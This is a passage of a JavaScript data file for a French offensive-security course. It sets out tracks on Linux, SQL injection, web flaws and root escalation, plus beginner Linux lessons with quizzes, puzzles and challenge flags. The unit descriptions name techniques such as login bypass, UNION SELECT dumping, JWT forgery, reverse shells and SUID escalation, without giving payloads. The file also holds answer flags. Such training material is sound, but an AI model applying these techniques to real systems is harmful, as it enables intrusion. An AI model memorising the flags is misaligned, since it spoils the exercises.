// ============================================================================
// CYBERRANGE PRO - CURRICULUM PÉDAGOGIQUE OFFENSIF "DE ZÉRO À PRO"
// 5 Pistes Complètes, 61 Niveaux Granulaires Denses, Multi-Slides Détaillées,
// Schémas SVG, Line-Clickers, Puzzles Tactiles, Quiz et Environnements Réels
// ============================================================================

window.CYBER_TRACKS = [
  {
    "id": "track-linux",
    "title": "Piste 1 : Linux & Ligne de Commande (Niveau Zéro à Pro)",
    "icon": "🐧",
    "moduleIds": [
      "m1"
    ]
  },
  {
    "id": "track-network",
    "title": "Piste 2 : Réseau Fondamental : De l'IP au Web",
    "icon": "🌐",
    "moduleIds": [
      "m2"
    ]
  },
  {
    "id": "track-sql",
    "title": "Piste 3 : SQL & Injections SQL (De Zéro à Pro)",
    "icon": "💉",
    "moduleIds": [
      "m3"
    ]
  },
  {
    "id": "track-client",
    "title": "Piste 4 : Failles Web Client & Sessions (XSS / IDOR / JWT)",
    "icon": "⚡",
    "moduleIds": [
      "m4"
    ]
  },
  {
    "id": "track-server",
    "title": "Piste 5 : Failles Serveur & Élévation Root (RCE / PrivEsc)",
    "icon": "💀",
    "moduleIds": [
      "m5"
    ]
  }
];

window.CYBER_UNITS = [
  {
    "id": "m1",
    "trackId": "track-linux",
    "number": 1,
    "title": "Linux & Terminal : Les Fondations du Hacker",
    "icon": "🐧",
    "badgeColor": "bg-cyan-500",
    "description": "Apprends à utiliser le terminal Linux à partir de zéro absolu : navigation, arborescence, fichiers, pipes, filtres grep, permissions chmod, processus et gestion de paquets."
  },
  {
    "id": "m2",
    "trackId": "track-network",
    "number": 2,
    "title": "Réseau Fondamental : Du Câble aux Protocoles",
    "icon": "🌐",
    "badgeColor": "bg-emerald-500",
    "description": "Comprends ce qu'est une adresse IP, un port réseau, une requête HTTP, le rôle du DNS, le handshake TCP à 3 voies, et maîtrise l'outil en ligne de commande curl et le scanner nmap."
  },
  {
    "id": "m3",
    "trackId": "track-sql",
    "number": 3,
    "title": "Bases de Données & Injections SQL (SQLi)",
    "icon": "💉",
    "badgeColor": "bg-rose-500",
    "description": "Comprends comment stocker et filtrer des données en SQL (SELECT, WHERE), puis apprends à briser la syntaxe pour contourner les logins et vider les tables avec UNION SELECT."
  },
  {
    "id": "m4",
    "trackId": "track-client",
    "number": 4,
    "title": "Failles Côté Client, Cookies & Authentification",
    "icon": "🔑",
    "badgeColor": "bg-amber-500",
    "description": "Découvre comment fonctionne un navigateur web, inspecte les cookies de session avec les DevTools, détourne des contrôles d'accès IDOR, exploite les failles XSS et falsifie des jetons JWT."
  },
  {
    "id": "m5",
    "trackId": "track-server",
    "number": 5,
    "title": "Injections Serveur & Conquête du Root (PrivEsc)",
    "icon": "💀",
    "badgeColor": "bg-purple-600",
    "description": "Force le serveur à exécuter des commandes arbitraires (RCE), contourne les filtres avec IFS, comprends les reverse shells et escalade tes privilèges vers l'utilisateur root suprême via SUID et GTFOBins."
  }
];

window.CYBER_LEVELS = [
  {
    "id": "m1-l1",
    "unitId": "m1",
    "title": "1. Qu'est-ce qu'un Terminal & whoami",
    "icon": "💻",
    "xp": 30,
    "lessonSlides": [
      {
        "title": "Le Terminal : L'Interface Sans Souris",
        "bullets": [
          "Un système d'exploitation possède deux modes de contrôle : l'interface graphique (GUI) avec fenêtres et souris, et l'interface textuelle (CLI) appelée le **Terminal**.",
          "Dans un terminal, on ne clique sur rien : on tape des instructions textuelles précises appelées des **commandes**.",
          "En cybersécurité et en piratage éthique, les professionnels travaillent à 95% dans un terminal : c'est 100 fois plus rapide, scriptable et ça donne un contrôle total sur la machine."
        ]
      },
      {
        "title": "L'Invite de Commande (Le Prompt)",
        "bullets": [
          "Quand tu ouvres un terminal, tu découvres une ligne étrange appelée le prompt : `operator@cyberlab:~$ `.",
          "`operator` est le nom de l'utilisateur actuellement connecté.",
          "`cyberlab` est le nom de la machine sur le réseau (hostname).",
          "`~` (tilde) indique que tu te trouves dans ton dossier personnel.",
          "`$` indique un utilisateur aux droits normaux. Les administrateurs suprêmes (**root**) ont le symbole `#` !"
        ]
      },
      {
        "title": "La Première Commande : whoami",
        "bullets": [
          "Lorsqu'on pénètre sur un serveur distant ou qu'on ouvre un shell, la question fondamentale est : *Qui suis-je sur cette machine ?*.",
          "La commande `whoami` (contraction de *Who Am I* en anglais) demande directement au noyau Linux le nom du compte utilisateur actif.",
          "Il suffit de taper `whoami` et d'appuyer sur la touche Entrée."
        ],
        "syntaxBox": {
          "command": "whoami",
          "description": "Interroge le système pour connaître ton identifiant de compte courant.",
          "example": "operator"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#1e293b\" stroke-width=\"2\"/>\n          <circle cx=\"40\" cy=\"35\" r=\"5\" fill=\"#f43f5e\"/>\n          <circle cx=\"55\" cy=\"35\" r=\"5\" fill=\"#f59e0b\"/>\n          <circle cx=\"70\" cy=\"35\" r=\"5\" fill=\"#10b981\"/>\n          <text x=\"35\" y=\"75\" fill=\"#10b981\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">operator@cyberlab:~$</text>\n          <text x=\"215\" y=\"75\" fill=\"#38bdf8\" font-size=\"14\" font-family=\"monospace\">whoami</text>\n          <line x1=\"285\" y1=\"62\" x2=\"285\" y2=\"78\" stroke=\"#38bdf8\" stroke-width=\"2\" class=\"animate-pulse\"/>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Découvre l'identité de ton compte courant :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ whoami",
            "isCritical": true,
            "note": "whoami affiche le nom de l'utilisateur qui tape la commande"
          },
          {
            "num": 3,
            "text": "operator"
          }
        ],
        "prompt": "Clique sur la commande qui demande au système qui est l'utilisateur connecté :"
      },
      "tokenPuzzle": {
        "instruction": "Tape ta toute première commande Linux pour vérifier ton identité :",
        "tokens": [
          "whoami",
          "hostname",
          "exit"
        ],
        "correctOrder": [
          "whoami"
        ]
      },
      "quickQuiz": {
        "prompt": "À quoi sert principalement la commande 'whoami' dans un terminal Linux ?",
        "options": [
          {
            "text": "À mesurer la vitesse de connexion réseau entre l'ordinateur et le serveur distant.",
            "isCorrect": false,
            "debrief": "Faux. La vitesse de connexion se mesure avec des outils comme ping ou iperf."
          },
          {
            "text": "À afficher le nom d'utilisateur du compte actuellement actif dans le terminal.",
            "isCorrect": true,
            "debrief": "Exact ! whoami signifie littéralement 'qui suis-je'."
          },
          {
            "text": "À supprimer définitivement tous les fichiers temporaires du système d'exploitation.",
            "isCorrect": false,
            "debrief": "Faux. whoami ne modifie aucun fichier, c'est une simple lecture d'identité."
          },
          {
            "text": "À redémarrer instantanément l'ordinateur en mode sans échec pour mise à jour.",
            "isCorrect": false,
            "debrief": "Faux. Pour redémarrer, on utilise la commande reboot ou shutdown."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal interactif ci-dessous, tape la commande whoami pour vérifier ton identité d'opérateur. Soumets le nom affiché !",
      "flag": "operator"
    }
  },
  {
    "id": "m1-l2",
    "unitId": "m1",
    "title": "2. L'Arborescence & Se Repérer avec pwd",
    "icon": "🧭",
    "xp": 30,
    "lessonSlides": [
      {
        "title": "L'Arborescence Linux : Un Arbre Inversé",
        "bullets": [
          "Contrairement à Windows qui utilise des lettres de lecteur (`C:\\`, `D:\\`), Linux organise absolument tout sous une racine unique notée `/` (slash).",
          "Tous les dossiers et disques sont rattachés sous cette racine : `/home`, `/etc`, `/var`, `/usr`.",
          "Dans un terminal, tu te trouves **toujours** à l'intérieur d'un répertoire précis à un instant T (appelé le répertoire de travail)."
        ]
      },
      {
        "title": "La Boussole du Terminal : pwd",
        "bullets": [
          "Quand tu navigues et que tu ne sais plus où tu te situes, utilise la commande `pwd`.",
          "`pwd` signifie **Print Working Directory** (afficher le répertoire de travail en cours).",
          "Le système t'affiche alors le chemin absolu complet depuis la racine `/` jusqu'à ton dossier actuel (ex: `/home/operator`)."
        ],
        "syntaxBox": {
          "command": "pwd",
          "description": "Affiche le chemin absolu du dossier dans lequel tu te trouves.",
          "example": "/home/operator"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <circle cx=\"60\" cy=\"60\" r=\"30\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"60\" y=\"65\" fill=\"#38bdf8\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">/</text>\n          <line x1=\"90\" y1=\"60\" x2=\"160\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <circle cx=\"190\" cy=\"60\" r=\"30\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"190\" y=\"64\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">home</text>\n          <line x1=\"220\" y1=\"60\" x2=\"290\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <circle cx=\"320\" cy=\"60\" r=\"30\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"320\" y=\"64\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">operator</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ pwd",
            "isCritical": true,
            "note": "pwd affiche le chemin absolu du dossier courant"
          },
          {
            "num": 2,
            "text": "/home/operator"
          }
        ],
        "prompt": "Clique sur la commande qui révèle le dossier de travail courant :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande qui affiche ton emplacement dans l'arborescence :",
        "tokens": [
          "pwd",
          "whoami",
          "ls"
        ],
        "correctOrder": [
          "pwd"
        ]
      },
      "quickQuiz": {
        "prompt": "Que signifie précisément l'acronyme de la commande 'pwd' ?",
        "options": [
          {
            "text": "Power Down (éteindre immédiatement l'ordinateur en toute sécurité).",
            "isCorrect": false,
            "debrief": "Faux. Pour éteindre le système, on utilise shutdown ou poweroff."
          },
          {
            "text": "Print Working Directory (afficher le répertoire de travail actuel).",
            "isCorrect": true,
            "debrief": "Bravo ! pwd permet de toujours savoir exactement où tu es dans l'arborescence."
          },
          {
            "text": "Process Watcher Daemon (afficher les processus en arrière-plan).",
            "isCorrect": false,
            "debrief": "Faux. Pour voir les processus, on utilise ps ou top."
          },
          {
            "text": "Password (changer le mot de passe de sécurité de l'utilisateur).",
            "isCorrect": false,
            "debrief": "Faux. Pour changer de mot de passe, la commande est 'passwd'."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Tape 'pwd' dans le terminal pour afficher ton chemin complet. Soumets la chaîne de chemin retournée !",
      "flag": "/home/operator"
    }
  },
  {
    "id": "m1-l3",
    "unitId": "m1",
    "title": "3. Explorer les Dossiers avec ls",
    "icon": "📂",
    "xp": 30,
    "lessonSlides": [
      {
        "title": "Regarder autour de Soi : La Commande ls",
        "bullets": [
          "Une fois qu'on sait où l'on est, on veut savoir ce qui s'y trouve : quels fichiers et sous-dossiers existent ?",
          "La commande `ls` (abréviation de *List*) liste le contenu du répertoire courant.",
          "C'est comme ouvrir les yeux dans une pièce pour voir ce qui est posé sur la table."
        ]
      },
      {
        "title": "Distinguer Fichiers et Dossiers",
        "bullets": [
          "Dans la sortie de `ls`, les noms de fichiers s'affichent souvent avec une extension (`notes.txt`, `script.sh`).",
          "Les dossiers s'affichent généralement dans une couleur différente (bleu ou cyan selon le terminal).",
          "Si tu tapes `ls`, tu verras notamment un dossier nommé `projet_secret` !"
        ],
        "syntaxBox": {
          "command": "ls",
          "description": "Liste les fichiers et dossiers visibles dans le répertoire courant.",
          "example": "notes.txt  projet_secret"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"80\" y=\"65\" fill=\"#38bdf8\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">ls</text>\n          <line x1=\"140\" y1=\"60\" x2=\"200\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"210\" y=\"25\" width=\"160\" height=\"30\" rx=\"6\" fill=\"#030712\" stroke=\"#3b82f6\"/>\n          <text x=\"220\" y=\"45\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\">📄 notes.txt</text>\n          <rect x=\"210\" y=\"65\" width=\"160\" height=\"30\" rx=\"6\" fill=\"#030712\" stroke=\"#10b981\"/>\n          <text x=\"220\" y=\"85\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\">📁 projet_secret</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ ls",
            "isCritical": true,
            "note": "ls énumère tous les fichiers du dossier"
          },
          {
            "num": 2,
            "text": "notes.txt   projet_secret"
          }
        ],
        "prompt": "Clique sur la commande qui liste les fichiers présents :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande fondamentale pour énumérer le contenu de ton dossier :",
        "tokens": [
          "ls",
          "cat",
          "cd"
        ],
        "correctOrder": [
          "ls"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la fonction essentielle de la commande 'ls' sous Linux ?",
        "options": [
          {
            "text": "Supprimer les fichiers temporaires pour libérer de la mémoire vive.",
            "isCorrect": false,
            "debrief": "Faux. Pour supprimer, on utilise rm."
          },
          {
            "text": "Lister les noms des fichiers et répertoires présents dans le dossier courant.",
            "isCorrect": true,
            "debrief": "Parfait ! ls vient de 'list' et affiche les entrées du répertoire."
          },
          {
            "text": "Lancer un scan de sécurité sur les ports réseau de la machine.",
            "isCorrect": false,
            "debrief": "Faux. Le scan de ports se fait avec nmap."
          },
          {
            "text": "Créer un nouveau fichier texte vierge sur le disque dur.",
            "isCorrect": false,
            "debrief": "Faux. Pour créer un fichier vierge, on utilise touch."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ls'. Repère le dossier secret présent dans /home/operator et soumets son nom exact !",
      "flag": "projet_secret"
    }
  },
  {
    "id": "m1-l4",
    "unitId": "m1",
    "title": "4. Fichiers Cachés et Options avec ls -la",
    "icon": "🕵️",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Les Options (Flags) d'une Commande",
        "bullets": [
          "Une commande Linux peut être enrichie d'**options** (ou drapeaux/flags) précédées d'un tiret `-` pour modifier son comportement.",
          "`ls -l` active le mode **Long** : affiche les permissions, le propriétaire, la taille en octets et la date de modification.",
          "`ls -a` active le mode **All** : révèle tous les fichiers, y compris les fichiers cachés !"
        ]
      },
      {
        "title": "Le Secret des Fichiers Cachés",
        "bullets": [
          "Sous Linux, un fichier caché n'a rien de magique : son nom commence simplement par un **point** (ex: `.bashrc`, `.bash_history`).",
          "Ces fichiers contiennent très souvent des configurations critiques, des clés secrètes ou l'historique des commandes tapées par l'administrateur !",
          "On combine très souvent les deux options en tapant `ls -la` pour tout voir dans les moindres détails."
        ],
        "syntaxBox": {
          "command": "ls -la",
          "description": "Liste tous les fichiers détaillés, y compris les fichiers cachés commençant par un point.",
          "example": "-rw-r--r-- 1 operator operator 220 Oct 27 10:00 .bashrc"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"35\" y=\"45\" fill=\"#fbbf24\" font-size=\"12\" font-family=\"monospace\">ls -la : Tout révéler</text>\n          <text x=\"35\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">drwxr-xr-x 1 operator operator 4096 .</text>\n          <text x=\"35\" y=\"88\" fill=\"#f43f5e\" font-size=\"11\" font-family=\"monospace\">-rw------- 1 operator operator  180 <tspan font-weight=\"bold\">.bashrc</tspan> (Caché !)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ ls -la",
            "isCritical": true,
            "note": "L'option -a révèle les fichiers cachés commençant par un point"
          },
          {
            "num": 2,
            "text": ".  ..  .bash_history  .bashrc  notes.txt  projet_secret"
          }
        ],
        "prompt": "Clique sur la commande avec options qui affiche les fichiers cachés :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande pour lister l'ensemble des fichiers cachés avec détails :",
        "tokens": [
          "ls",
          "-la",
          "cat",
          "pwd"
        ],
        "correctOrder": [
          "ls",
          "-la"
        ]
      },
      "quickQuiz": {
        "prompt": "Sous Linux, quelle particularité distingue un fichier caché d'un fichier classique ?",
        "options": [
          {
            "text": "Seul l'utilisateur root a le droit physique de le lire.",
            "isCorrect": false,
            "debrief": "Faux. Tout utilisateur peut créer et lire ses propres fichiers cachés."
          },
          {
            "text": "Son contenu est chiffré avec une clé RSA à 4096 bits.",
            "isCorrect": false,
            "debrief": "Faux. Le point n'implique aucun chiffrement, c'est une simple convention d'affichage."
          },
          {
            "text": "Il est stocké dans un secteur défectueux du disque dur.",
            "isCorrect": false,
            "debrief": "Faux. Il est stocké normalement dans le système de fichiers."
          },
          {
            "text": "Son nom commence par un point '.' (comme .bashrc ou .bash_history).",
            "isCorrect": true,
            "debrief": "Exact ! Tout fichier dont le nom commence par un point est masqué par défaut par ls."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ls -la'. Repère le nom du fichier de configuration bash caché qui commence par un point et soumets son nom !",
      "flag": ".bashrc"
    }
  },
  {
    "id": "m1-l5",
    "unitId": "m1",
    "title": "5. Naviguer dans l'Arborescence avec cd",
    "icon": "🚶",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Changer de Dossier : La Commande cd",
        "bullets": [
          "`cd` signifie **Change Directory** (changer de répertoire). C'est l'équivalent textuel du double-clic sur un dossier avec la souris.",
          "Pour entrer dans un dossier, tape `cd nom_du_dossier` (ex: `cd projet_secret`).",
          "Ton invite de commande (le prompt) se met automatiquement à jour pour afficher ton nouvel emplacement !"
        ]
      },
      {
        "title": "Reculer avec le Double Point (..)",
        "bullets": [
          "Comment fait-on marche arrière pour sortir d'un dossier ? On utilise deux points consécutifs : `..`.",
          "Sous Linux, `..` désigne toujours le **dossier parent** (celui qui est situé juste un cran au-dessus).",
          "Taper `cd ..` te fait immédiatement remonter d'un étage dans l'arborescence."
        ]
      },
      {
        "title": "Raccourcis de Téléportation Rapides",
        "bullets": [
          "`cd /` : te téléporte directement à la racine absolue du système.",
          "`cd ~` (ou simplement `cd` tout court) : te ramène directement dans ton dossier personnel chez toi.",
          "`cd -` : revient au dossier précédent où tu étais juste avant (comme le bouton retour d'un navigateur web)."
        ],
        "syntaxBox": {
          "command": "cd projet_secret",
          "description": "Entre dans le répertoire spécifié.",
          "example": "operator@cyberlab:~/projet_secret$"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">/home/operator</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Dossier de départ</text>\n          <path d=\"M 170 60 L 220 60\" stroke=\"#10b981\" stroke-width=\"3\" marker-end=\"url(#arrow)\"/>\n          <rect x=\"230\" y=\"30\" width=\"140\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"300\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">projet_secret</text>\n          <text x=\"300\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">cd projet_secret</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ pwd"
          },
          {
            "num": 2,
            "text": "/home/operator"
          },
          {
            "num": 3,
            "text": "operator@cyberlab:~$ cd projet_secret",
            "isCritical": true,
            "note": "cd permet d'entrer dans un sous-dossier"
          },
          {
            "num": 4,
            "text": "operator@cyberlab:~/projet_secret$ "
          }
        ],
        "prompt": "Clique sur la commande qui te fait entrer dans le dossier projet_secret :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande pour entrer dans le répertoire 'projet_secret' :",
        "tokens": [
          "cd",
          "projet_secret",
          "ls",
          "rm"
        ],
        "correctOrder": [
          "cd",
          "projet_secret"
        ]
      },
      "quickQuiz": {
        "prompt": "Que désigne la notation spéciale '..' (deux points) dans un chemin Linux ?",
        "options": [
          {
            "text": "Le fichier le plus volumineux présent sur le disque.",
            "isCorrect": false,
            "debrief": "Faux. '..' est un lien vers le répertoire parent."
          },
          {
            "text": "Une commande pour dupliquer le dossier courant.",
            "isCorrect": false,
            "debrief": "Faux. Pour copier, on utilise cp."
          },
          {
            "text": "Le répertoire parent situé immédiatement au-dessus dans l'arborescence.",
            "isCorrect": true,
            "debrief": "Exact ! cd .. te fait remonter d'un niveau."
          },
          {
            "text": "La corbeille temporaire du système d'exploitation.",
            "isCorrect": false,
            "debrief": "Faux. Linux n'a pas de concept '..' pour la corbeille."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cd projet_secret' pour entrer dans le dossier, puis tape 'cat flag_novice.txt' pour lire le drapeau d'orientation !",
      "flag": "CYBER{LINUX_NAVIGATOR_LEVEL_COMPLETED}"
    }
  },
  {
    "id": "m1-l6",
    "unitId": "m1",
    "title": "6. Créer des Dossiers et Fichiers : mkdir & touch",
    "icon": "✨",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Créer un Dossier : mkdir",
        "bullets": [
          "Pour organiser ton travail ou stocker des outils d'attaque, tu dois pouvoir créer des répertoires.",
          "`mkdir` signifie **Make Directory** (fabriquer un répertoire).",
          "Exemple : `mkdir lab_test` crée immédiatement un sous-dossier vierge nommé `lab_test`."
        ]
      },
      {
        "title": "Créer un Fichier Vierge : touch",
        "bullets": [
          "Pour créer un nouveau fichier vide en quelques millisecondes sans ouvrir d'éditeur lourd, on utilise la commande `touch`.",
          "Exemple : `touch notes.txt` crée un fichier vide prêt à recevoir du texte.",
          "Si le fichier existe déjà, `touch` met simplement à jour sa date de dernière modification sans effacer son contenu."
        ],
        "syntaxBox": {
          "command": "mkdir lab_test && touch lab_test/test.txt",
          "description": "Crée un nouveau répertoire puis crée un fichier à l'intérieur.",
          "example": "Nouveau dossier et fichier créés avec succès."
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"40\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"105\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">mkdir dossier</text>\n          <text x=\"105\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Nouveau Répertoire</text>\n          <line x1=\"180\" y1=\"60\" x2=\"220\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"230\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"295\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">touch fichier</text>\n          <text x=\"295\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Nouveau Fichier</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "operator@cyberlab:~$ mkdir lab_test",
            "isCritical": true,
            "note": "mkdir crée un dossier nommé lab_test"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ touch lab_test/test.txt"
          },
          {
            "num": 3,
            "text": "operator@cyberlab:~$ ls lab_test"
          },
          {
            "num": 4,
            "text": "test.txt"
          }
        ],
        "prompt": "Clique sur la commande qui crée le nouveau dossier lab_test :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue l'ordre pour créer un dossier puis un fichier à l'intérieur :",
        "tokens": [
          "mkdir lab_test",
          "touch lab_test/test.txt",
          "rm -rf"
        ],
        "correctOrder": [
          "mkdir lab_test",
          "touch lab_test/test.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle commande permet de créer un fichier vide instantanément dans un terminal Linux ?",
        "options": [
          {
            "text": "grep nom_du_fichier (recherche des chaînes de caractères).",
            "isCorrect": false,
            "debrief": "Faux. grep sert à chercher du texte."
          },
          {
            "text": "touch nom_du_fichier (crée le fichier vide si inexistant).",
            "isCorrect": true,
            "debrief": "Exactement ! touch est très rapide et souvent utilisé par les scripts."
          },
          {
            "text": "cat nom_du_fichier (crée un fichier et formate le disque).",
            "isCorrect": false,
            "debrief": "Faux. cat sert à lire ou concaténer des fichiers."
          },
          {
            "text": "pwd nom_du_fichier (imprime le mot de passe dans le fichier).",
            "isCorrect": false,
            "debrief": "Faux. pwd affiche le dossier courant."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'mkdir lab_test' puis 'touch lab_test/test.txt'. Vérifie avec 'ls lab_test' et soumets le nom du fichier créé !",
      "flag": "test.txt"
    }
  },
  {
    "id": "m1-l7",
    "unitId": "m1",
    "title": "7. Copier et Déplacer : cp & mv",
    "icon": "📦",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Copier des Fichiers : cp",
        "bullets": [
          "`cp` signifie **Copy** (copier). La syntaxe est : `cp source destination`.",
          "Exemple : `cp notes.txt notes_backup.txt` duplique le fichier. L'original reste intact et une copie identique est créée.",
          "Pour copier un dossier complet avec tout son contenu, on ajoute l'option récursive `-r` : `cp -r dossier_source dossier_copie`."
        ]
      },
      {
        "title": "Déplacer et Renommer : mv",
        "bullets": [
          "`mv` signifie **Move** (déplacer).",
          "Sous Linux, déplacer et renommer sont exactement la même opération !",
          "Si tu tapes `mv ancien_nom.txt nouveau_nom.txt`, le fichier ne bouge pas de dossier mais change de nom instantanément."
        ],
        "syntaxBox": {
          "command": "cp notes.txt notes_backup.txt",
          "description": "Duplique notes.txt vers notes_backup.txt.",
          "example": "notes.txt  notes_backup.txt"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"35\" width=\"100\" height=\"50\" rx=\"6\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"80\" y=\"65\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">source.txt</text>\n          <path d=\"M 140 60 L 250 60\" stroke=\"#f59e0b\" stroke-width=\"2\" stroke-dasharray=\"4\"/>\n          <text x=\"195\" y=\"50\" fill=\"#fbbf24\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">cp / mv</text>\n          <rect x=\"260\" y=\"35\" width=\"110\" height=\"50\" rx=\"6\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"65\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">dest.txt</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Duplique les notes vers une sauvegarde :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ cp notes.txt notes_backup.txt",
            "isCritical": true,
            "note": "cp duplique le fichier vers la destination spécifiée"
          },
          {
            "num": 3,
            "text": "operator@cyberlab:~$ ls notes*"
          },
          {
            "num": 4,
            "text": "notes.txt  notes_backup.txt"
          }
        ],
        "prompt": "Clique sur la commande qui duplique le fichier notes.txt :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande pour copier notes.txt vers notes_backup.txt :",
        "tokens": [
          "cp",
          "notes.txt",
          "notes_backup.txt",
          "mv"
        ],
        "correctOrder": [
          "cp",
          "notes.txt",
          "notes_backup.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Sous Linux, quelle commande utilise-t-on pour renommer un fichier 'ancien.txt' en 'nouveau.txt' ?",
        "options": [
          {
            "text": "mv ancien.txt nouveau.txt (déplacer équivaut à renommer).",
            "isCorrect": true,
            "debrief": "Exactement ! Sous Linux, changer de nom est un simple déplacement de pointeur d'inode."
          },
          {
            "text": "chmod 777 ancien.txt nouveau.txt",
            "isCorrect": false,
            "debrief": "Faux. chmod modifie les permissions d'accès, pas le nom."
          },
          {
            "text": "touch -r ancien.txt nouveau.txt",
            "isCorrect": false,
            "debrief": "Faux. touch modifie les dates d'accès, il ne renomme pas."
          },
          {
